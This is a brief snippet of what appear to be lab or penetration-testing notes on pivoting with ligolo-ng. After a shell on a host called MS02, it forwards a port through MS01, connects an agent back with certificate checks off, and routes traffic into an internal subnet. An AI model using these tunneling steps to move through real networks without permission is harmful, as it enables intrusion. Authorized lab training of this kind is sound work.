```
# After shell on MS02, expose ligolo port via listener on MS01:
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601 --tcp
# On MS02:
.\agent.exe -connect <MS01_IP>:11601 -ignore-cert
# New session appears in proxy → start → add route:
sudo ip route add 172.16.0.0/24 dev ligolo
```